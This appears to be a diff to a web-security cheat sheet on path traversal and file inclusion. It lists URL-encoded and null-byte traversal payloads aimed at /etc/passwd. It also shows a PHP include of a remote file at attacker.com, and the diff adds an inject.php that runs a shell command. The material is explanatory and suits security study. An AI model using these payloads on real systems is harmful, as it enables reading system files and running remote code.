@@ -21,6 +21,7 @@ Usually, this type of attack is based on dot-dot-slash notation.
 %2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 
 # truncate string (PHP < 5.3.4) using null byte
+# useful when something is appended like ".php"
 ../../../etc/passwd0x00
 ../../../etc/passwd%00
 ../../../etc/passwd\0
@@ -58,5 +59,11 @@ For example, the function `include` can also import external sources:
 ```php
 <?php
   include("http://attacker.com/inject.php");
+?>
+```
+
+```php title="inject.php"
+<?php
+  print(exec("hostname"));
 ?>
 ```
